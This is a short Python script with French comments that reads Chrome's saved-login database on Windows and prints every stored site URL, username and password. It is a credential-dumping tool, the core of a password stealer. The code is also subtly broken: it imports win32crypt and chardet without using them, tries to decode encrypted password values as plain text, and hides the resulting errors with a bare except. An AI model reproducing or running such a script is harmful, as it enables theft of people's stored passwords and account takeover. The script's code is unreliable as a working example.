import os
import sqlite3
import win32crypt
import chardet

# chemin de l'emplacement de stockage des mots de passe de Chrome
path = os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data"

# Connexion à la base de données contenant les informations de connexion
conn = sqlite3.connect(path)
cursor = conn.cursor()

cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

# Récupération des informations de connexion
data = cursor.fetchall()

# Affichage des informations de connexion

encodings = ['utf-8', 'windows-1252', 'iso-8859-1']

for item in data:
    for encoding in encodings:
        try:
           
            print("URL: " + item[0])
            print("Nom d'utilisateur: " + item[1])
            print("Mot de passe: " + item[2].decode(encoding))
            break
        except:
            continue

conn.close()
